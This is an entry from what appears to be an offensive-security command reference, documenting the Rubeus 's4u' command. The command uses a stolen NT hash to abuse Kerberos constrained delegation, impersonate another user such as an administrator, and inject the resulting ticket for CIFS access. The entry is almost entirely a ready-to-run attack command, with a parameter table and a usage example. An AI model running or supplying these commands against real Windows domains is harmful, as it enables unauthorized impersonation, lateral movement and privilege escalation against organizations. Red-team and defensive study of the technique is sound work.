---
id: 406cf745-ed0a-4ddd-bfd7-001bc8d3fcb5
name: s4u-delegation-with-nt-hash-rubeus
type: command
executor: powershell
data: >-
  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash
  /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com
  /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
output: null
created_at: '2023-04-06T03:56:07.695421+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
  - ntlm
verified: true
validated: true
---

# s4u-delegation-with-nt-hash-rubeus

## Command

```powershell
Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
```

## Description

Executes S4U2 using an NT hash (RC4) for authentication, impersonating a user to get a delegated ticket.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user | Delegating user (e.g., machine$) | Yes |
| /rc4 | NTLM hash | Yes |
| /impersonateuser | Target user to impersonate | Yes |
| /domain | Domain | Yes |
| /dc | Domain Controller | Yes |
| /msdsspn | Target SPN | Yes |
| /altservice | Alternate services | Yes |
| /ptt | Pass-the-ticket injection | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe s4u /user:MACHINE$ /rc4:rc4hash /impersonateuser:Admin /domain:domain.com /dc:dc01 /msdsspn:"cifs/dc.domain.com" /altservice:cifs /ptt
```

## Expected Output

Ticket injected; no errors in Kerberos response.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Rubeus]]
